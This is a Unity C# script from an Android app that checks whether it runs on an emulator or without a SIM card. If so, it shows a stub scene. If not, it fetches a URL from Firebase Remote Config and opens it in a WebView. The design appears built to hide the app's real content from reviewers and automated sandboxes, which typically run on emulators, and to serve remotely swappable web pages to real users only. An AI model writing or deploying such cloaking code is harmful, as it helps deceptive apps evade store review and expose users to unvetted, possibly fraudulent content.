  using Firebase.Extensions;
  using System;
  using System.Threading.Tasks;
  using System.Collections;
  using UnityEngine;
  using UnityEngine.SceneManagement;
  using UnityEngine.UI;
  using UnityEngine.Networking;
 

  public class ConditionsChecker : MonoBehaviour {
    public string link;
    public GameObject error;
    private AndroidJavaObject javaClass;
    public bool networkError;
    Firebase.DependencyStatus dependencyStatus = Firebase.DependencyStatus.UnavailableOther;
    protected bool isFirebaseInitialized = false;

    protected void Start() {
      if (PlayerPrefs.HasKey("SavedString")) {
        link = PlayerPrefs.GetString("SavedString");
        GameManager.link = link;
        StartCoroutine(testNet());
      } else {
        javaClass = new AndroidJavaObject("com.java.myapplication.cond");
        Boolean checkEmu = javaClass.Call<Boolean>("checkIsEmu");
        AndroidJavaClass jcUnityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject joUnityActivity = jcUnityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
        Boolean checkSIM = javaClass.Call<Boolean>("checkSIM", joUnityActivity);
        if (checkEmu || !checkSIM)
          SceneManager.LoadScene("Scenes/StubScene");
        else {
          Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWithOnMainThread(task => {
              dependencyStatus = task.Result;
              if (dependencyStatus == Firebase.DependencyStatus.Available)
                InitializeFirebase();
              else
                Debug.LogError("Could not resolve all Firebase dependencies: " + dependencyStatus);
          });
        }
      }
    }

    void InitializeFirebase() {
        System.Collections.Generic.Dictionary<string, object> defaults = new System.Collections.Generic.Dictionary<string, object>();
        Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.SetDefaultsAsync(defaults).ContinueWithOnMainThread(task => {
            Debug.Log("RemoteConfig configured and ready!");
            isFirebaseInitialized = true;
        });
        FetchDataAsync();
    }

    public Task FetchDataAsync() {
      Debug.Log("Fetching data...");
      System.Threading.Tasks.Task fetchTask = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.FetchAsync(TimeSpan.Zero);
      return fetchTask.ContinueWithOnMainThread(FetchComplete);
    }

    void FetchComplete(Task fetchTask) {
      if (fetchTask.IsCanceled) {
        Debug.Log("Fetch canceled.");
      } else if (fetchTask.IsFaulted) {
        Debug.Log("Fetch encountered an error.");
      } else if (fetchTask.IsCompleted) {
        Debug.Log("Fetch completed successfully!");
      }

        var info = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.Info;
        switch (info.LastFetchStatus) {
            case Firebase.RemoteConfig.LastFetchStatus.Success:
            Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.ActivateAsync().ContinueWithOnMainThread(task => {
              Debug.Log(String.Format("Remote data loaded and ready (last fetch time {0}).", info.FetchTime));
              Show();
            });

            break;
            case Firebase.RemoteConfig.LastFetchStatus.Failure:
            switch (info.LastFetchFailureReason) {
                case Firebase.RemoteConfig.FetchFailureReason.Error:
                Debug.Log("Fetch failed for unknown reason");
                break;
                case Firebase.RemoteConfig.FetchFailureReason.Throttled:
                Debug.Log("Fetch throttled until " + info.ThrottledEndTime);
                break;
            }
            break;
            case Firebase.RemoteConfig.LastFetchStatus.Pending:
            Debug.Log("Latest Fetch call still pending.");
            break;
        }
    }

    public void Show() {
      link = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
      Debug.Log(link);
      if (link == "")
        SceneManager.LoadScene("Scenes/StubScene");
      else {
        PlayerPrefs.SetString("SavedString", link);
        PlayerPrefs.Save();
        GameManager.link = link;
        StartCoroutine(testNet());
      }
    }

    IEnumerator testNet() {
      UnityWebRequest request = UnityWebRequest.Get("https://www.google.ru/");
        yield return request.SendWebRequest();
        if (request.result == UnityWebRequest.Result.ConnectionError) 
          error.SetActive(true);
        else
          SceneManager.LoadScene("Scenes/WebViewScene");
    }
  }